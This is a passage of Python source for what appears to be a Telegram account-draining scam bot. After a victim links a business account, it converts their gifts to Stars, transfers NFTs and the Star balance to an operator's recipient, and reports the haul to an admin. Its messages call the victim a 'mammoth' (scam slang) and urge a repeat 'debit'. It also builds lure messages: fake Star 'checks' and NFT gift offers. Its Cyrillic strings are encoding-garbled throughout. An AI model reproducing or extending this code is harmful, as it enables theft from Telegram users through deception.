        log_with_id(f"üîÑ –ù–∞—á–∏–Ω–∞–µ–º –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—é {len(regular_gifts)} –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤")
        
        for gift in regular_gifts:
            log_with_id(f"‚û°Ô∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–∞ ID {gift.owned_gift_id} (—Ç–∏–ø: {gift.type})")
            try:
                await bot(ConvertGiftToStars(
                    business_connection_id=bc_id,
                    owned_gift_id=gift.owned_gift_id
                ))
                stats["converted"] += 1
                log_with_id(f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω –ø–æ–¥–∞—Ä–æ–∫ ID {gift.owned_gift_id} –≤ –∑–≤—ë–∑–¥—ã")
                
            except TelegramBadRequest as e:
                stats["errors"] += 1
                err_msg = str(e)
                if "STARGIFT_CONVERT_TOO_OLD" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"‚ö†Ô∏è –ü–æ–¥–∞—Ä–æ–∫ —Å–ª–∏—à–∫–æ–º —Å—Ç–∞—Ä ‚Äî –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞", "warning")
                elif "BOT_ACCESS_FORBIDDEN" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"üö´ –ù–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—é (BOT_ACCESS_FORBIDDEN), –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–æ–¥–∞—Ä–æ–∫", "warning")
                    continue
                elif "BUSINESS_CONNECTION_INVALID" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"‚ùå BUSINESS_CONNECTION_INVALID ‚Äî –±–∏–∑–Ω–µ—Å-–∫–æ–Ω–Ω–µ–∫—Ç –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π, –ø—Ä–µ—Ä—ã–≤–∞–µ–º —Ü–∏–∫–ª", "error")
                    break
                elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"‚ùå PREMIUM_ACCOUNT_REQUIRED ‚Äî –Ω—É–∂–µ–Ω –ø—Ä–µ–º–∏—É–º –∞–∫–∫–∞—É–Ω—Ç, –ø—Ä–µ—Ä—ã–≤–∞–µ–º —Ü–∏–∫–ª", "error")
                    break
                else:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"üö´ –û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏: {e}", "warning")
                    
            except Exception as e:
                stats["errors"] += 1
                stats["regular_convert_failed"] += 1
                log_with_id(f"‚ùóÔ∏è –ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}", "error")

            await asyncio.sleep(0.1)

        log_with_id(f"‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–æ: –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ {stats['converted']} –ø–æ–¥–∞—Ä–∫–æ–≤, –æ—à–∏–±–æ–∫: {stats['errors']}")

    except Exception as e:
        stats["errors"] += 1
        log_with_id(f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}", "error")

# –ü–µ—Ä–µ–≤–æ–¥ –æ—Å—Ç–∞—Ç–∫–∞ –∑–≤—ë–∑–¥
async def transfer_remaining_stars_after_processing(
    bot: Bot, 
    bc_id: str, 
    worker_bot: WorkerBot, 
    admin: Admin, 
    stats: dict, 
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    PART_SIZE = 10000

    try:
        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            amount = int(stars.amount)
            log_with_id(f"üí´ –û—Å—Ç–∞—Ç–æ–∫ –∑–≤—ë–∑–¥ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ: {amount}")
        except TelegramBadRequest as e:
            log_with_id(f"DEBUG: Exception on balance: {e}, type={type(e)}", "error")
            err_msg = str(e)
            if "BOT_ACCESS_FORBIDDEN" in err_msg:
                log_with_id("‚ö†Ô∏è –ë–æ—Ç –Ω–µ –∏–º–µ–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∑–≤—ë–∑–¥–∞–º (BOT_ACCESS_FORBIDDEN), –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–µ—Ä–µ–¥–∞—á—É", "warning")
                stats["errors"] += 1
                return
            elif "BUSINESS_CONNECTION_INVALID" in err_msg:
                log_with_id("‚ùå BUSINESS_CONNECTION_INVALID ‚Äî –±–∏–∑–Ω–µ—Å-–∫–æ–Ω–Ω–µ–∫—Ç –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º", "error")
                stats["errors"] += 1
                return
            elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                log_with_id("‚ùå PREMIUM_ACCOUNT_REQUIRED ‚Äî –Ω—É–∂–µ–Ω –ø—Ä–µ–º–∏—É–º –∞–∫–∫–∞—É–Ω—Ç, –æ–ø–µ—Ä–∞—Ü–∏—è –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞", "error")
                stats["errors"] += 1
                return
            else:
                stats["errors"] += 1
                log_with_id(f"‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞: {e}", "error")
                return

        if amount > 0 and worker_bot.nft_transfer_to_id:
            to_send = amount
            part_num = 1
            while to_send > 0:
                part = min(to_send, PART_SIZE)
                try:
                    log_with_id(f"üöÄ [{part_num}] –ü—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–¥–∞—Ç—å {part} –∑–≤—ë–∑–¥ –Ω–∞ {worker_bot.nft_transfer_to_id}")
                    await bot(TransferBusinessAccountStars(
                        business_connection_id=bc_id,
                        star_count=part,
                        new_owner_chat_id=worker_bot.nft_transfer_to_id
                    ))
                    stats["stars_transferred"] += part
                    stats["stars_really_transferred"] = True  
                    log_with_id(f"‚úÖ [{part_num}] –£–°–ü–ï–®–ù–û –ü–ï–†–ï–î–ê–ù–û {part} –∑–≤—ë–∑–¥ –ø–æ–ª—É—á–∞—Ç–µ–ª—é {worker_bot.nft_transfer_to_id}")
                    to_send -= part
                    part_num += 1
                except TelegramBadRequest as e:
                    stats["errors"] += 1
                    err_msg = str(e)
                    log_with_id(f"‚ùå [{part_num}] TelegramBadRequest –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ {part} –∑–≤—ë–∑–¥: {e} (type={type(e)})", "warning")
                    if "BUSINESS_CONNECTION_INVALID" in err_msg:
                        log_with_id(f"‚ùå [{part_num}] BUSINESS_CONNECTION_INVALID –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ ‚Äî –ø—Ä–µ—Ä—ã–≤–∞–µ–º –¥–∞–ª—å–Ω–µ–π—à–∏–µ –ø–æ–ø—ã—Ç–∫–∏.", "error")
                        break
                    elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                        log_with_id(f"‚ùå [{part_num}] PREMIUM_ACCOUNT_REQUIRED ‚Äî –Ω—É–∂–µ–Ω –ø—Ä–µ–º–∏—É–º –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏, –ø—Ä–µ—Ä—ã–≤–∞–µ–º.", "error")
                        break
                    log_with_id(f"DEBUG: –û—à–∏–±–∫–∞ –¥–∞–Ω–Ω—ã–µ - part={part}, –æ—Å—Ç–∞—Ç–æ–∫={to_send}, type={type(part)}")
                    break  
                except Exception as e:
                    stats["errors"] += 1
                    log_with_id(f"‚ùå [{part_num}] –ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ {part} –∑–≤—ë–∑–¥: {e} (type={type(e)})", "error")
                    break  

    except Exception as e:
        stats["errors"] += 1
        err = f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e} (type={type(e)})"
        log_with_id(err, "exception")

def build_stats():
    return {
        "nft_success": 0,
        "nft_not_unique": 0,
        "converted": 0,
        "regular_convert_failed": 0,
        "stars_transferred": 0,
        "stars_really_transferred": False,
        "errors": 0,
        "nft_hold_too_early": 0,
        "balance_too_low": False,
        "nft_not_sent": 0,
        "current_stars": 0,
    }

def build_transfer_disabled_msgs(settings):
    msgs = []
    if not (settings and settings.transfer_stars_enabled):
        msgs.append("–ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥ –æ—Ç–∫–ª—é—á–µ–Ω–∞")
    if not (settings and settings.convert_gifts_to_stars_enabled):
        msgs.append("–û–±–º–µ–Ω –ø–æ–¥–∞—Ä–∫–æ–≤ –Ω–∞ –∑–≤—ë–∑–¥—ã –æ—Ç–∫–ª—é—á—ë–Ω")
    return msgs

def build_summary(
    business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
):
    summary = (
        f"<b>üëâ #{business_user_id}</b>\n"
        f"<b>üì¶ –°–≤–æ–¥–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏:</b>\n"
        f"<b>‚úÖ NFT –ø–µ—Ä–µ–¥–∞–Ω–æ:</b> <code>{stats['nft_success']}</code>\n"
        f"<b>üïí NFT —Å —Ö–æ–ª–¥–æ–º:</b> <code>{len(hold_nfts)}</code>\n"
        f"<b>‚ôªÔ∏è –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ –≤ –∑–≤—ë–∑–¥—ã:</b> <code>{stats['converted']}</code>\n"
        f"<b>‚ùóÔ∏è –°—Ç–∞—Ä—ã–µ –ø–æ–¥–∞—Ä–∫–∏:</b> <code>{stats['regular_convert_failed']}</code>\n"
        f"<b>‚≠êÔ∏è –ó–≤—ë–∑–¥ –ø–µ—Ä–µ–¥–∞–Ω–æ:</b> <code>{stats['stars_transferred']}</code>\n"
        f"<b>üö® –û—à–∏–±–æ–∫ –∑–∞ –ø—Ä–æ—Ü–µ—Å—Å:</b> <code>{stats['errors']}</code>\n"
    )

    if hold_nfts:
        summary += "\n<b>üïí NFT —Å —Ö–æ–ª–¥–æ–º:</b>\n"
        for slug, link, unlock_dt in hold_nfts:
            if link:
                summary += f"‚Ä¢ <b><a href='{link}'>{slug}</a></b> ‚Äî <code>{unlock_dt}</code>\n"
            else:
                summary += f"‚Ä¢ <b>{slug}</b> ‚Äî <code>{unlock_dt}</code>\n"

    if stats.get("balance_too_low"):
        nft_not_sent = stats.get("nft_not_sent", 0)
        current_stars = stats.get("current_stars", 0)
        need_stars = max(0, nft_not_sent * 25 - current_stars)
        summary += (
            f"\n<blockquote>"
            f"<b>‚ùóÔ∏è –î–ª—è –ø–æ–ª–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ –ø–æ–ø–æ–ª–Ω–∏ –º–∏–Ω–∏–º—É–º: {need_stars}‚≠êÔ∏è</b>\n"
            "‚úÖ –ü–æ–ø–æ–ª–Ω–∏ –∑–≤—ë–∑–¥—ã –º–∞–º–æ–Ω—Ç—É –∏ –∑–∞–ø—É—Å—Ç–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ–µ —Å–ø–∏—Å–∞–Ω–∏–µ!"
            "</blockquote>"
        )

    if transfer_disabled_msgs:
        summary += (
            "\n<blockquote>‚ö†Ô∏è –ù–µ–∫–æ—Ç–æ—Ä—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Ç–∫–ª—é—á–µ–Ω—ã –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏:\n" +
            "\n".join(f"‚Ä¢ {msg}" for msg in transfer_disabled_msgs) +
            "</blockquote>"
        )
    return summary

async def handle_gift_processing_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    business_user_id: int,
    connected_user_id: int,
    session,
    summary_only: bool = False,
    manual: bool = False  # –Ω–æ–≤—ã–π —Ñ–ª–∞–≥
):
    admin = await session.scalar(
        select(Admin).options(selectinload(Admin.settings)).where(Admin.id == admin.id)
    )
    settings = admin.settings

    stats = build_stats()
    transfer_logger = get_transfer_logger(admin.telegram_id)
    transfer_disabled_msgs = build_transfer_disabled_msgs(settings)

    successful_nfts = []
    hold_nfts = []

    try:
        transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –ø–µ—Ä–≤–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ NFT ===")
        successful_nfts, hold_nfts = await transfer_all_nfts_after_connection(
            bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
        )

        if settings and settings.convert_gifts_to_stars_enabled:
            transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã ===")
            await convert_regular_gifts_only(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("‚õîÔ∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏")

        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            transfer_logger.info(f"–ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ –ø–æ—Å–ª–µ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏: {stars.amount}")
            stats["current_stars"] = stars.amount

            if stars.amount >= 25:
                transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –ø–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ NFT –ø–æ—Å–ª–µ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ ===")
                await transfer_all_nfts_after_connection(
                    bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
                )
            else:
                transfer_logger.info("–ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–µ—Ä–µ–¥–∞—á–∞ NFT –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è: –±–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ < 25")
        except Exception as e:
            stats["errors"] += 1
            transfer_logger.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –±–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–µ—Ä–µ–¥–∞—á–∏ NFT: {e}")

        if settings and settings.transfer_stars_enabled:
            transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –ø–µ—Ä–µ–¥–∞—á–∞ –æ—Å—Ç–∞–≤—à–∏—Ö—Å—è –∑–≤—ë–∑–¥ ===")
            await transfer_remaining_stars_after_processing(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("‚õîÔ∏è –ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏")

    except Exception as e:
        stats["errors"] += 1
        transfer_logger.error(f"‚ùóÔ∏è –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –ø–µ—Ä–µ–¥–∞—á–∏: {e}")

    finally:
        if summary_only:
            return {
                "nft_success": stats["nft_success"],
                "stars_transferred": stats["stars_transferred"],
                "converted": stats["converted"],
                "hold_total": stats["nft_hold_too_early"],
                "hold_nfts": hold_nfts,
            }

        transfer_logger.info("=== –ò—Ç–æ–≥–æ–≤–∞—è —Å–≤–æ–¥–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ (–æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –∞–¥–º–∏–Ω—É) ===")

        summary = build_summary(
            business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
        )

        await send_log(admin.telegram_id, summary)
        transfer_logger.info("–°–≤–æ–¥–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω—É")

        stars_total = stats["stars_transferred"]

        try:
            await update_admin_stats(
                session,
                admin,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            await update_global_stats(
                session,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            transfer_logger.info(f"[STATS_UPDATED] Admin {admin.telegram_id} (NFT={stats['nft_success']}, Stars={stars_total})")
        except Exception as e:
            transfer_logger.error(f"[STATS_UPDATE_ERROR] {e}")

        if stats["stars_really_transferred"] or stats["nft_success"] > 0:
            async def send_log_in_background():
                try:
                    if manual:
                        await send_manual_transfer_log_to_channel(
                            admin.telegram_id,
                            stars_total,
                            stats["nft_success"]
                        )
                        transfer_logger.info("–†—É—á–Ω–æ–π –ª–æ–≥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –∫–∞–Ω–∞–ª")
                    else:
                        await send_admin_transfer_log_to_channel(
                            admin.telegram_id,
                            stars_total,
                            stats["nft_success"]
                        )
                        transfer_logger.info("–ú–∞—Å—Å–æ–≤—ã–π –ª–æ–≥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –∫–∞–Ω–∞–ª")
                except Exception as e:
                    transfer_logger.error(f"[SEND_LOG_TO_CHANNEL_ERROR] {e}")

            asyncio.create_task(send_log_in_background())

async def update_global_stats(session, nft=0, regular=0, stars=0):
    stats = await session.scalar(select(GlobalStats).limit(1))
    if not stats:
        stats = GlobalStats()
        session.add(stats)
        await session.commit()
        await session.refresh(stats)

    stats.daily_gifts_unique += nft
    stats.daily_stars_sent += stars

    stats.total_gifts_unique += nft
    stats.total_stars_sent += stars

    await session.commit()

async def update_admin_stats(session, admin: Admin, nft=0, regular=0, stars=0):
    admin.gifts_unique_sent += nft
    admin.stars_sent += stars

    admin.daily_gifts_unique += nft
    admin.daily_stars_sent += stars

    await session.commit()

def gen_check_code() -> str:
    return secrets.token_urlsafe(8).replace("-", "_").replace(".", "_")

async def handle_webhook_inline_query(data, bot: Bot, token: str, request):
    async with Session() as session:
        userbot = await session.scalar(
            select(WorkerBot)
            .where(WorkerBot.token == token)
        )
        if not userbot or not userbot.username:
            return web.Response()

        custom_gift = None
        slugs = []

        if userbot.custom_template_id:
            custom_gift = await session.get(CustomGift, userbot.custom_template_id)
            if custom_gift:
                try:
                    slugs = json.loads(custom_gift.slugs)
                except Exception:
                    slugs = []

    dp = Dispatcher(storage=MemoryStorage())
    router = Router()

    @router.inline_query(F.query)
    async def inline_handler(inline_query: InlineQuery):
        query_text = inline_query.query.strip()
        results = []

        if re.fullmatch(r"\d+", query_text):
            if userbot.base_template_id != "base_6":
                await inline_query.answer(
                    [],
                    cache_time=1,
                    is_personal=True,
                    switch_pm_text="–°–æ–∑–¥–∞–Ω–∏–µ —á–µ–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –≤ —à–∞–±–ª–æ–Ω–µ Base 6",
                    switch_pm_parameter="need_base_6"
                )
                return

            stars_amount = int(query_text)
            if stars_amount <= 0:
                await inline_query.answer([], cache_time=1, is_personal=True)
                return

            price_usd = stars_amount * STAR_PRICE
            link_url = "https://t.me/portals_community"

            code = gen_check_code()
            async with Session() as s:
                s.add(StarCheck(code=code, stars_amount=stars_amount))
                await s.commit()

            bot_url = f"https://t.me/{userbot.username}?start=check_{code}"

            results.append(
                InlineQueryResultArticle(
                    id=f"star-check-{code}",
                    title=f"–ß–µ–∫ –Ω–∞ {stars_amount} ‚≠êÔ∏è (–æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–π)",
                    description=f"${price_usd:.2f}",
                    input_message_content=InputTextMessageContent(
                        message_text=(
                            f"üíé <b><a href='{link_url}'>–ß–µ–∫</a></b> "
                            f"–Ω–∞ {stars_amount} ‚≠êÔ∏è <b>(${price_usd:.2f}).</b>"
                        ),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    ),
                    reply_markup=InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(
                                text=f"–ü–æ–ª—É—á–∏—Ç—å {stars_amount} ‚≠êÔ∏è",
                                url=bot_url
                            )]
                        ]
                    )
                )
            )

        else:
            if custom_gift and slugs:
                for slug in slugs:
                    slug = slug.strip().replace('"', '').replace("'", "")
                    title = slug.split("-")[0]
                    message_text = custom_gift.message_text or "<i>–¢–ï–°–¢</i>"
                    button_text = custom_gift.button_text or "üéÅ –ü—Ä–∏–Ω—è—Ç—å"
                    url = f"https://t.me/nft/{slug}"
                    ref_url = f"https://t.me/{userbot.username}?start=ref_{userbot.owner_id}_{slug}"

                    results.append(
                        InlineQueryResultArticle(
                            id=f"{slug}-{title}",
                            title=title,
                            input_message_content=InputTextMessageContent(
                                message_text=f"<b><a href='{url}'>{title}</a></b>\n\n{message_text}",
                                parse_mode="HTML",
                            ),
                            reply_markup=InlineKeyboardMarkup(
                                inline_keyboard=[
                                    [InlineKeyboardButton(text=button_text, url=ref_url)]
                                ]
                            )
                        )
                    )

        await inline_query.answer(results or [], cache_time=1, is_personal=True)

    dp.include_router(router)
    handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    return await handler.handle(request)